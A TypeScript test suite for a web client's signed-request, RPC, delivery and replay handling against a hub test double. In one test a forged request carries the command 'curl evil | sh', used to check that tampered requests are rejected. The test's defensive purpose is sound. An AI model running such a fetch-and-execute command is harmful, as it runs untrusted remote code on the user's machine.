// The conversation's live state against the DX3 double: requests drawn only once their code verifies, held through
// their settlement, and pending again when raised again after it, live or across the audit record's replay; deliveries per event and recipient, verified, kept by the hub across a reload; RPCs sealed with the
// org key and followed through every DX6 state, an `uncertain` one retried with its own nonce; a web `human` sealed,
// sent, and followed until the log holds it or the hub refuses it; a session's compaction.
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { importOrgKey, inputSha256, seal, verify, verifyRpc, type Delivery, type OrgKey, type Raised } from 'desk-hub/protocol';
import { DOUBLE_MEMBER, HubDouble } from '../../test/double/hub-double';
import { VECTOR_KEY, VECTOR_PROJECT as PROJECT } from '../../test/vectors';
import { cardState } from '../conversation/card-state';
import { memoryLogRecord } from '../log/record';
import { latency } from '../latency/latency';
import { ProjectConnection } from './connection';
import { Conversation, requestKey } from './conversation';

const S1 = '67646a1b-2f5e-4c1d-8a3b-9c0d1e2f3a4b';
const S2 = '0f1e2d3c-4b5a-4968-8776-655443322110';
const M = DOUBLE_MEMBER.id;
/** A request's key: the hub's identity, (machine, session, request). */
const k = (request: string, session = S1, machine = 'mini') => requestKey({ machine, session, request });

const until = async (check: () => boolean, ms = 3000) => {
  const start = Date.now();
  while (!check()) {
    if (Date.now() - start > ms) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 10));
  }
};

let hub: HubDouble;
let key: OrgKey;
let connections: ProjectConnection[] = [];

beforeEach(async () => {
  hub = await HubDouble.start({ orgKey: VECTOR_KEY });
  key = await importOrgKey(VECTOR_KEY);
  hub.setMachines(PROJECT, [{ machine: 'mini', online: true, policy: { read_only: false, ceiling: 'default' }, checkouts: [] }]);
});
afterEach(async () => {
  for (const c of connections) c.stop();
  connections = [];
  await hub.close();
});

async function connect(record = memoryLogRecord()) {
  const connection = new ProjectConnection(PROJECT, { base: hub.url.replace(/^http/, 'ws'), record, delay: () => 20 });
  connections.push(connection);
  connection.setKey(key);
  await connection.start();
  await until(() => connection.live.getState().caughtUp);
  return connection;
}
const conv = (c: ProjectConnection) => c.conversation.store.getState();
const bash: Omit<Raised, 'mac'> = { request: 'toolu_1', session: S1, tool: 'Bash', input: { command: 'pnpm e2e', description: 'Run the e2e suite' } };

describe('requests', () => {
  it('draws a raised request once its code verifies, and keeps it, settled, after it leaves the pending set', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests[k('toolu_1')] !== undefined);
    expect(conv(c).requests[k('toolu_1')]).toMatchObject({ machine: 'mini', pending: true, terminalOnly: false, settled: null });
    hub.markTerminalOnly(PROJECT, 'toolu_1');
    await until(() => conv(c).requests[k('toolu_1')].terminalOnly);
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'terminal', outcome: 'allow', by: 'terminal' });
    await until(() => conv(c).requests[k('toolu_1')].settled !== null);
    expect(conv(c).requests[k('toolu_1')]).toMatchObject({ pending: false, settled: { winner: 'terminal', outcome: 'allow' } });
  });

  it('never draws a request whose code fails, and reports it', async () => {
    const c = await connect();
    const genuine = await hub.raise(PROJECT, 'mini', bash);
    hub.raiseRaw(PROJECT, 'mini', { ...genuine, request: 'toolu_2', input: { command: 'curl evil | sh' } });
    await until(() => conv(c).unverified.length > 0);
    expect(conv(c).requests[k('toolu_2')]).toBeUndefined();
    expect(conv(c).unverified).toEqual([{ what: 'request', machine: 'mini', session: S1, id: 'toolu_2' }]);
  });

  it("keeps two sessions' requests apart when their bridges minted the same id, and settles only the one settled", async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', { ...bash, request: 'request-1', input: { command: 'one' } });
    await hub.raise(PROJECT, 'mini', { ...bash, request: 'request-1', session: S2, input: { command: 'two' } });
    await until(() => conv(c).requests[k('request-1')] !== undefined && conv(c).requests[k('request-1', S2)] !== undefined);
    expect(conv(c).requests[k('request-1')].raised.input).toEqual({ command: 'one' });
    expect(conv(c).requests[k('request-1', S2)].raised.input).toEqual({ command: 'two' });
    await hub.settle(PROJECT, 'mini', S1, { request: 'request-1', winner: 'terminal', outcome: 'allow', by: 'terminal' });
    await until(() => conv(c).requests[k('request-1')].settled !== null);
    expect(conv(c).requests[k('request-1', S2)]).toMatchObject({ pending: true, settled: null });
    const nonce = await c.decide(M, conv(c).requests[k('request-1', S2)], 'allow');
    expect(conv(c).rpcs[nonce].request).toBe(k('request-1', S2));
  });

  it('draws the latest verified content raised under one id: a replayed decision carries it', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', { ...bash, input: { command: 'one' } });
    await until(() => conv(c).requests[k('toolu_1')] !== undefined);
    const raised = await seal(key, 'raised', PROJECT, { ...bash, input: { command: 'different' } });
    const settled = await seal(key, 'settled', PROJECT, { request: 'toolu_1', winner: 'terminal' as const, outcome: 'allow' as const, by: 'terminal' });
    hub.setPending(PROJECT, []);
    hub.decide(PROJECT, { machine: 'mini', session: S1, settled, raised });
    await until(() => conv(c).requests[k('toolu_1')].settled !== null);
    expect(conv(c).requests[k('toolu_1')].raised.input).toEqual({ command: 'different' });
    // A later payload that fails its code is reported, and the latest verified one stays drawn.
    hub.decide(PROJECT, { machine: 'mini', session: S1, settled, raised: { ...raised, input: { command: 'forged' } } });
    await until(() => conv(c).unverified.length === 1);
    expect(conv(c).requests[k('toolu_1')].raised.input).toEqual({ command: 'different' });
  });
});

describe("decisions the tab did not see (DX3's `decided`, replayed after caught-up)", () => {
  const msg = (text: string) => ({ writer: `mini/${S1}`, kind: 'message', from: 'maws-45', to: 'host', text, src: text });

  it('draws a request settled before the tab connected as settled, placed after the log as it stood when it was decided', async () => {
    await hub.append(PROJECT, msg('before'), '2026-01-01T00:00:00.000Z');
    await hub.raise(PROJECT, 'mini', bash);
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'web', outcome: 'allow', by: M });
    await hub.append(PROJECT, msg('after'), '2099-01-01T00:00:00.000Z');
    const c = await connect();
    await until(() => conv(c).requests[k('toolu_1')]?.settled != null);
    expect(conv(c).requests[k('toolu_1')]).toMatchObject({ machine: 'mini', pending: false, at: 1, settled: { winner: 'web', outcome: 'allow', by: M } });
  });

  it('keeps where a request it saw live was placed, and takes the decision as its settlement', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests[k('toolu_1')] !== undefined);
    await hub.append(PROJECT, msg('later'));
    await until(() => c.log.held() === 1);
    hub.dropConnections(); // the reconnect replays the decision
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'terminal', outcome: 'deny', by: 'terminal' });
    await until(() => conv(c).requests[k('toolu_1')].settled !== null);
    expect(conv(c).requests[k('toolu_1')]).toMatchObject({ at: 0, settled: { winner: 'terminal' } });
  });

  it('never draws a decision whose request or settlement fails its code', async () => {
    const raised = await hub.raise(PROJECT, 'mini', bash);
    const settled = await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'web', outcome: 'allow', by: M });
    hub.decide(PROJECT, { machine: 'mini', session: S1, settled: { ...settled, request: 'toolu_2' }, raised: { ...raised, request: 'toolu_2' } });
    hub.decide(PROJECT, { machine: 'mini', session: S1, settled: { ...settled, request: 'toolu_3', outcome: 'deny' }, raised: null });
    const c = await connect();
    await until(() => conv(c).requests[k('toolu_1')]?.settled != null && conv(c).unverified.length === 1);
    expect(conv(c).requests[k('toolu_2')]).toBeUndefined();
    expect(conv(c).requests[k('toolu_3')]).toBeUndefined();
    expect(conv(c).unverified).toEqual([{ what: 'request', machine: 'mini', session: S1, id: 'toolu_2' }]);
  });
});

// A resumed session's bridge raises its still-open ask again under its call's id, which the first process's end settled
// (withdrawn). The raise outranks that settlement wherever this tab took it from: live, or the audit record's replay.
describe('a request raised again after its settlement (MAWS #71)', () => {
  const ID = 'toolu_plugin_resumed';
  const ask: Omit<Raised, 'mac'> = {
    request: ID,
    session: S1,
    tool: 'mcp__doperpowers__AskUserQuestion',
    input: { questions: [{ question: 'Ship it tonight?', header: 'Ship', options: [{ label: 'yes' }, { label: 'no' }], multiSelect: false }] },
    async: true,
  };
  const can = { can: true, reason: null };
  const withdraw = () => hub.settle(PROJECT, 'mini', S1, { request: ID, winner: 'other', outcome: 'withdrawn', by: 'bridge' });
  const answer = () => hub.settle(PROJECT, 'mini', S1, { request: ID, winner: 'web', outcome: 'answered', by: M });
  const asked = (c: ProjectConnection) => conv(c).requests[k(ID)];
  let markers = 0;
  /** Every frame sent before it is drawn: a request raised after them is. */
  async function marker(c: ProjectConnection) {
    const request = `toolu_marker_${++markers}`;
    await hub.raise(PROJECT, 'mini', { ...bash, request });
    await until(() => conv(c).requests[k(request)] !== undefined);
  }
  async function reconnect(c: ProjectConnection) {
    const resumes = hub.resumes(PROJECT).length;
    hub.dropConnections();
    await until(() => hub.resumes(PROJECT).length > resumes && c.live.getState().caughtUp);
  }

  it('is pending again with its answer control, live, and its answer settles it', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', ask);
    await until(() => asked(c)?.pending === true);
    await withdraw();
    await until(() => asked(c).settled !== null);
    expect(asked(c)).toMatchObject({ pending: false, settled: { outcome: 'withdrawn' } });
    await hub.raise(PROJECT, 'mini', ask);
    await until(() => asked(c).pending);
    expect(asked(c).settled).toBeNull();
    expect(cardState(asked(c), null, can)).toEqual({ kind: 'open', window: false });
    await c.answer(M, asked(c), { 'Ship it tonight?': 'yes' });
    await answer();
    await until(() => asked(c).settled !== null);
    expect(asked(c)).toMatchObject({ pending: false, settled: { winner: 'web', outcome: 'answered', by: M } });
  });

  it('stays pending in a tab that saw the withdrawal live when a reconnect replays it, and its answer settles it', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', ask);
    await withdraw();
    await until(() => asked(c)?.settled != null);
    await hub.raise(PROJECT, 'mini', ask);
    await until(() => asked(c).pending);
    await reconnect(c);
    await marker(c);
    expect(asked(c)).toMatchObject({ pending: true, settled: null });
    await answer();
    await until(() => asked(c).settled !== null);
    expect(asked(c)).toMatchObject({ pending: false, settled: { outcome: 'answered' } });
  });

  it('is pending again when a pending set alone holds it again (a machine republishing its set sends no `raised`), and its answer settles it', async () => {
    const c = await connect();
    const raised = await hub.raise(PROJECT, 'mini', ask);
    await withdraw();
    await until(() => asked(c)?.settled != null);
    hub.setPending(PROJECT, [{ machine: 'mini', raised, terminal_only: false }]);
    await until(() => asked(c).pending);
    expect(asked(c).settled).toBeNull();
    await answer();
    await until(() => asked(c).settled !== null);
    expect(asked(c)).toMatchObject({ pending: false, settled: { outcome: 'answered' } });
  });

  it('is pending in a tab opened after the withdrawal, which takes the withdrawal from the replay, and its answer settles it', async () => {
    await hub.raise(PROJECT, 'mini', ask);
    await withdraw();
    await hub.raise(PROJECT, 'mini', ask);
    const c = await connect();
    await marker(c);
    expect(asked(c)).toMatchObject({ pending: true, settled: null });
    expect(cardState(asked(c), null, can)).toEqual({ kind: 'open', window: false });
    await answer();
    await until(() => asked(c).settled !== null);
    expect(asked(c)).toMatchObject({ pending: false, settled: { outcome: 'answered' } });
  });

  it('takes the settlement of the raise again from the replay when it came while the tab was away', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', ask);
    await withdraw();
    await until(() => asked(c)?.settled != null);
    await hub.raise(PROJECT, 'mini', ask);
    await until(() => asked(c).pending);
    hub.dropConnections();
    await answer();
    await until(() => asked(c).settled?.outcome === 'answered');
    expect(asked(c).pending).toBe(false);
    const fresh = await connect();
    await marker(fresh);
    expect(asked(fresh)).toMatchObject({ pending: false, settled: { outcome: 'answered' } });
  });

  it("leaves behind this tab's decision on the raise the settlement ended: its late refusal no longer draws the card", async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', ask);
    await until(() => asked(c)?.pending === true);
    const nonce = await c.answer(M, asked(c), { 'Ship it tonight?': 'yes' });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.answerRpc(PROJECT, nonce, { state: 'failed', error: { code: 'not-pending', message: 'withdrawn', winner: 'other', by: 'bridge' } });
    await until(() => conv(c).rpcs[nonce]?.state === 'failed');
    expect(conv(c).rpcs[nonce].request).toBe(k(ID));
    await withdraw();
    await until(() => asked(c).settled !== null);
    await hub.raise(PROJECT, 'mini', ask);
    await until(() => asked(c).pending);
    expect(conv(c).rpcs[nonce]).toMatchObject({ state: 'failed' });
    expect(conv(c).rpcs[nonce].request).toBeUndefined();
  });
});

describe('deliveries', () => {
  it('checks each delivery once when a reconnect replays many: the checks do not grow with the square of their number', async () => {
    const conversation = new Conversation(PROJECT, () => 0);
    conversation.setKey(key);
    const sealed = await Promise.all(
      Array.from({ length: 50 }, (_, i) => seal(key, 'delivery', PROJECT, { event: { writer: `hub/${M}`, seq: i + 1 }, session: S1, outcome: 'delivered', reason: '' }) as unknown as Promise<Delivery>),
    );
    const checks = vi.spyOn(crypto.subtle, 'verify');
    for (const delivery of sealed) conversation.delivery(null, delivery);
    await until(() => Object.keys(conversation.store.getState().deliveries).length === 50);
    expect(checks.mock.calls.length).toBeLessThanOrEqual(60);
    checks.mockRestore();
  });

  it('keeps each verified outcome per event and recipient, and the hub sends them again on connect', async () => {
    const c = await connect();
    await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 1 }, session: S1, outcome: 'recorded', reason: 'not live' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1] !== undefined);
    const forged = await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 2 }, session: S1, outcome: 'delivered', reason: '' });
    hub.deliverRaw(PROJECT, 'mini', { ...forged, outcome: 'failed' });
    c.stop();
    const again = await connect();
    await until(() => conv(again).deliveries[`hub/${M}:1`]?.[S1] !== undefined && conv(again).unverified.length > 0);
    expect(conv(again).deliveries[`hub/${M}:1`][S1].outcome).toBe('recorded');
    expect(conv(again).deliveries[`hub/${M}:2`]).toBeUndefined();
  });

  it('turns a recorded outcome delivered when the newer one comes live (Resume brought the session back)', async () => {
    const c = await connect();
    const at = { event: { writer: `hub/${M}`, seq: 1 }, session: S1, reason: '' };
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'recorded' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1]?.outcome === 'recorded');
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'delivered' });
    await until(() => conv(c).deliveries[`hub/${M}:1`][S1].outcome === 'delivered');
  });

  it("turns it delivered from a reconnect's deliveries too, and keeps an uncertain outcome as such", async () => {
    const c = await connect();
    const at = { event: { writer: `hub/${M}`, seq: 1 }, session: S1, reason: '' };
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'recorded' });
    await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 2 }, session: S1, reason: 'no answer', outcome: 'uncertain' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1]?.outcome === 'recorded' && conv(c).deliveries[`hub/${M}:2`] !== undefined);
    expect(conv(c).deliveries[`hub/${M}:2`][S1].outcome).toBe('uncertain');
    hub.admit = 'not-a-member'; // hold the browser off while the session is resumed and the message delivered
    hub.dropConnections();
    await until(() => c.live.getState().status === 'connecting');
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'delivered' });
    hub.admit = 'member';
    await until(() => conv(c).deliveries[`hub/${M}:1`][S1].outcome === 'delivered');
  });
});

describe('RPCs', () => {
  it('seals an RPC under the org key, follows its states, and retries an uncertain one with the same nonce and bytes', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    const [sent] = hub.rpcs(PROJECT);
    expect(await verifyRpc(key, sent, PROJECT)).toBe(true);
    expect(sent).toMatchObject({ rpc: 'interrupt', machine: 'mini', member: M, nonce, args: { session: S1 } });
    hub.dropMachine(PROJECT, 'mini');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    hub.restoreMachine(PROJECT, 'mini');
    c.retryRpc(nonce);
    await until(() => hub.rpcs(PROJECT).length === 2);
    expect(hub.rpcs(PROJECT)[1]).toEqual(sent);
    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { turnId: 't1', stopped: [], running: ['b7'] } as never });
    await until(() => conv(c).rpcs[nonce].state === 'done');
  });

  it('draws one settled outcome after forwarded, then uncertain, then the result the machine republished', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.answerRpc(PROJECT, nonce, 'uncertain');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { turnId: 't1', stopped: ['b1'], running: [] } });
    await until(() => conv(c).rpcs[nonce].state === 'done');
    expect(Object.keys(conv(c).rpcs)).toEqual([nonce]);
    expect(conv(c).rpcs[nonce].outcome).toEqual({ state: 'done', result: { turnId: 't1', stopped: ['b1'], running: [] } });
  });

  it('keeps an uncertain RPC uncertain while its machine is offline, and a retry then waits for the machine', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.dropMachine(PROJECT, 'mini');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    c.retryRpc(nonce);
    await until(() => hub.rpcs(PROJECT).length === 2);
    await until(() => conv(c).rpcs[nonce].state === 'uncertain'); // the hub holds it for the machine; not machine-offline
    expect(conv(c).rpcs[nonce].outcome).toBeUndefined();
  });

  it('refuses an RPC issued while the socket is down as not connected, and never sends it after the reconnect', async () => {
    const c = await connect();
    expect(c.live.getState().connected).toBe(true);
    hub.admit = 'not-a-member';
    hub.dropConnections();
    await until(() => c.live.getState().status === 'connecting');
    expect(c.live.getState().connected).toBe(false);
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    expect(conv(c).rpcs[nonce].state).toBe('not-connected');
    hub.admit = 'member';
    await until(() => c.live.getState().connected && c.live.getState().caughtUp);
    await new Promise((r) => setTimeout(r, 50));
    expect(hub.rpcs(PROJECT)).toEqual([]);
    expect(conv(c).rpcs[nonce].state).toBe('not-connected');
  });

  it('fails at once for a machine that is offline', async () => {
    const c = await connect();
    hub.dropMachine(PROJECT, 'mini');
    const nonce = await c.rpc(M, 'mini', 'compact', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'failed');
    expect(conv(c).rpcs[nonce].outcome).toMatchObject({ error: { code: 'machine-offline' } });
  });

  it('answers with the digest of exactly the request it drew', async () => {
    const c = await connect();
    const raised = await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests[k('toolu_1')] !== undefined);
    const nonce = await c.decide(M, conv(c).requests[k('toolu_1')], 'deny', 'not now');
    await until(() => hub.rpcs(PROJECT).length === 1);
    expect(hub.rpcs(PROJECT)[0].args).toEqual({ session: S1, digest: { session: S1, request: 'toolu_1', tool: 'Bash', input_sha256: await inputSha256(raised.input) }, decision: 'deny', message: 'not now' });
    expect(conv(c).rpcs[nonce].request).toBe(k('toolu_1'));
  });
});

describe('a web human', () => {
  it('is sealed by the member, waits in the outbox, and leaves it once the hub stores it', async () => {
    const c = await connect();
    const nonce = await c.say(M, [{ session: S1, alias: 'maws-45' }], '@maws-45 keep user_id', false);
    expect(conv(c).outbox[nonce]).toMatchObject({ text: '@maws-45 keep user_id', state: 'sending' });
    await until(() => conv(c).outbox[nonce] === undefined);
    const stored = hub.head(PROJECT);
    expect(stored).toBe(1);
    await until(() => c.log.drawable().length === 1);
    const event = c.log.drawable()[0].event;
    expect(event).toMatchObject({ kind: 'human', from: 'human', member: M, to: [{ session: S1, alias: 'maws-45' }], text: '@maws-45 keep user_id' });
    expect(await verify(key, 'log', PROJECT, event)).toBe(true);
  });

  it('stays in the outbox as refused when the hub refuses it', async () => {
    const c = await connect();
    const nonce = await c.say('0'.repeat(32), '*', 'not me', false);
    await until(() => conv(c).outbox[nonce]?.state === 'refused');
    expect(conv(c).outbox[nonce].reason).toContain('writer-not-yours');
  });
});

describe('compaction', () => {
  it("keeps each session's latest compaction message", async () => {
    const c = await connect();
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'start' });
    await until(() => conv(c).compactions[S1]?.phase === 'start');
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'end', tokensBefore: 180000, tokensAfter: 22000 });
    await until(() => conv(c).compactions[S1]?.phase === 'end');
    expect(conv(c).compactions[S1]).toMatchObject({ tokensBefore: 180000, tokensAfter: 22000 });
  });

  it('forgets a compaction under way at a reconnect: the hub replays none, so an end missed meanwhile cannot leave it running', async () => {
    const c = await connect();
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'start' });
    await until(() => conv(c).compactions[S1]?.phase === 'start');
    let welcomedAgain = false;
    const stop = c.live.subscribe((s) => (welcomedAgain ||= !s.caughtUp));
    hub.dropConnections();
    await until(() => welcomedAgain && c.live.getState().caughtUp);
    stop();
    expect(conv(c).compactions[S1]).toBeUndefined();
  });
});

describe("a command and its op (the desk control surface's M0)", () => {
  const op = (body: Record<string, unknown>) => hub.sendSession(PROJECT, { project: PROJECT, machine: 'mini', session: S1, kind: 'op', sub: null, n: null, body: body as never });

  it('sends the command RPC, keeps each op by its RPC nonce with its latest phase, and times it', async () => {
    const c = await connect();
    const before = latency.report().paths;
    const nonce = await c.command(M, 'mini', S1, 'rename', 'desk-m0', false);
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    expect(hub.rpcs(PROJECT)[0]).toMatchObject({ rpc: 'command', machine: 'mini', nonce, args: { session: S1, name: 'rename', args: 'desk-m0' } });
    // A bare command carries no args.
    const bare = await c.command(M, 'mini', S1, 'reload-plugins', '', false);
    await until(() => hub.rpcs(PROJECT).length === 2);
    expect(hub.rpcs(PROJECT)[1].args).toEqual({ session: S1, name: 'reload-plugins' });

    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { queued: true, route: 'run', id: 'c1' } });
    await until(() => conv(c).rpcs[nonce].state === 'done');
    op({ rpc: nonce, op: 'command', phase: 'start', id: 'c1', name: 'rename', args: 'desk-m0' });
    await until(() => conv(c).ops[nonce]?.phase === 'start');
    op({ rpc: nonce, op: 'command', phase: 'end', id: 'c1', name: 'rename', args: 'desk-m0', settled: { ok: true }, readback: { how: 'row', text: 'Session renamed to: desk-m0', uuid: 'u1' } });
    await until(() => conv(c).ops[nonce]?.phase === 'end');
    expect(conv(c).ops[nonce]).toEqual({ op: 'command', phase: 'end', session: S1, body: expect.objectContaining({ readback: { how: 'row', text: 'Session renamed to: desk-m0', uuid: 'u1' } }) });
    // A start the daemon republishes after its end (a restart owed it again) never takes the end back.
    op({ rpc: nonce, op: 'command', phase: 'start', id: 'c1', name: 'rename', args: 'desk-m0' });
    // An op another client started (the CLI: no nonce) is not this tab's to draw.
    op({ rpc: null, op: 'command', phase: 'end', id: 'c9', readback: { how: 'none' } });
    op({ rpc: bare, op: 'command', phase: 'start', id: 'c2', name: 'reload-plugins', args: '' });
    await until(() => conv(c).ops[bare] !== undefined);
    expect(conv(c).ops[nonce].phase).toBe('end');
    expect(Object.keys(conv(c).ops).sort()).toEqual([nonce, bare].sort());
    const after = latency.report().paths;
    expect(after['op.queued']?.n).toBe((before['op.queued']?.n ?? 0) + 1);
    expect(after['op.ran']?.n).toBe((before['op.ran']?.n ?? 0) + 1);
  });

  it("keeps the ops through a reconnect: an op's end owed to a nonce is drawn when it comes", async () => {
    const c = await connect();
    op({ rpc: 'BQUFBQUFBQUFBQUFBQUFBQ', op: 'command', phase: 'start', id: 'c1', name: 'color', args: 'red' });
    await until(() => conv(c).ops.BQUFBQUFBQUFBQUFBQUFBQ !== undefined);
    let welcomedAgain = false;
    const stop = c.live.subscribe((s) => (welcomedAgain ||= !s.caughtUp));
    hub.dropConnections();
    await until(() => welcomedAgain && c.live.getState().caughtUp);
    stop();
    expect(conv(c).ops.BQUFBQUFBQUFBQUFBQUFBQ?.phase).toBe('start');
  });
});

describe('a hub whose log was replaced (a local hub started afresh)', () => {
  it('starts the conversation over: no request, settlement, or delivery of the old hub stays drawn', async () => {
    const c = await connect();
    await hub.append(PROJECT, { writer: `mini/${S1}`, kind: 'message', from: 'maws-45', to: 'host', text: 'old', src: 'old' });
    await hub.raise(PROJECT, 'mini', bash);
    await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 1 }, session: S1, outcome: 'delivered', reason: '' });
    await until(() => c.log.held() === 1 && conv(c).requests[k('toolu_1')] !== undefined && conv(c).deliveries[`hub/${M}:1`] !== undefined);
    hub.recreate(PROJECT);
    await until(() => c.log.held() === 0 && c.live.getState().caughtUp);
    await until(() => conv(c).checked);
    expect(conv(c).requests).toEqual({});
    expect(conv(c).deliveries).toEqual({});
  });
});
